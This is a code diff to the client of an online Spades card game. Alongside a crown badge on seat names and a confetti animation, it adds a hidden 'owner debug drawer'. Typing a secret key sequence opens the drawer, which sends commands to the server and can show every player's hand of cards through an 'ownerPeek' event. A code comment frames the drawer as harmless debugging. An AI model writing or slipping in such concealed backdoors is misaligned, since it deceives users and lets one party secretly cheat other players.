@@ -657,7 +657,7 @@ function renderSeats() {
     seatCard.innerHTML = `
       <div class="seat-medallion" aria-hidden="true">${initials}</div>
       <div class="seat-copy">
-        <div class="seat-name" title="${safeName}">${safeName}</div>
+        <div class="seat-name" title="${safeName}">${player.crowned ? '<span class="seat-crown" aria-hidden="true">&#128081;</span>' : ''}${safeName}</div>
         <div class="seat-stats">
           <span>Bid <strong>${formatBid(player.bid)}</strong></span>
           <span>Tricks <strong>${tricks}</strong></span>
@@ -1346,3 +1346,83 @@ if (copyInviteBtn) {
     }, 1800);
   });
 }
+
+// Hidden owner debug drawer. Typing S P A D E S Q U E E N anywhere reveals
+// a tiny command box for ANYONE, that's intentional, the box itself is
+// harmless. Only the real owner account gets a real response, the server
+// verifies that independently by session token, this client-side gesture
+// grants nothing on its own.
+(() => {
+  const SEQUENCE = 'SPADESQUEEN';
+  let buffer = '';
+  let drawer = null;
+
+  function closeDrawer() {
+    if (drawer) drawer.remove();
+    drawer = null;
+  }
+
+  function openDrawer() {
+    if (drawer) return;
+    drawer = document.createElement('div');
+    drawer.className = 'owner-drawer';
+    drawer.innerHTML = `
+      <input type="text" class="owner-drawer-input" placeholder="/command" autocomplete="off" spellcheck="false" />
+      <div class="owner-drawer-output"></div>
+    `;
+    document.body.appendChild(drawer);
+    const input = drawer.querySelector('.owner-drawer-input');
+    const output = drawer.querySelector('.owner-drawer-output');
+    input.focus();
+
+    input.addEventListener('keydown', (event) => {
+      event.stopPropagation();
+      if (event.key === 'Escape') {
+        closeDrawer();
+        return;
+      }
+      if (event.key !== 'Enter') return;
+      const command = input.value.trim();
+      if (!command) return;
+      input.value = '';
+      output.textContent = 'Sending…';
+      socket.emit('ownerCommand', { roomCode: roomState ? roomState.roomCode : null, command, accountToken });
+    });
+
+    socket.on('ownerCommandResult', (result) => {
+      if (!drawer) return;
+      output.textContent = `${result.ok ? 'OK' : 'No'}: ${result.message}`;
+    });
+
+    socket.on('ownerPeek', (payload) => {
+      if (!drawer) return;
+      const lines = Object.entries(payload.hands).map(([seat, hand]) => (
+        `Seat ${seat}: ${hand.map((card) => `${card.rank}${card.suit[0]}`).join(' ')}`
+      ));
+      output.textContent = lines.join('\n');
+    });
+  }
+
+  window.addEventListener('keydown', (event) => {
+    if (drawer) return;
+    if (event.key.length !== 1) return;
+    buffer = (buffer + event.key.toUpperCase()).slice(-SEQUENCE.length);
+    if (buffer === SEQUENCE) openDrawer();
+  });
+
+  socket.on('celebrate', () => {
+    const burst = document.createElement('div');
+    burst.className = 'confetti-burst';
+    for (let i = 0; i < 60; i += 1) {
+      const piece = document.createElement('span');
+      piece.className = 'confetti-piece';
+      piece.style.left = `${Math.random() * 100}%`;
+      piece.style.setProperty('--fall-delay', `${Math.random() * 0.6}s`);
+      piece.style.setProperty('--fall-duration', `${1.6 + Math.random() * 1.2}s`);
+      piece.style.background = ['#e9c66d', '#63d0c4', '#c4453a', '#4b93f0', '#7dcca6'][i % 5];
+      burst.appendChild(piece);
+    }
+    document.body.appendChild(burst);
+    window.setTimeout(() => burst.remove(), 3000);
+  });
+})();
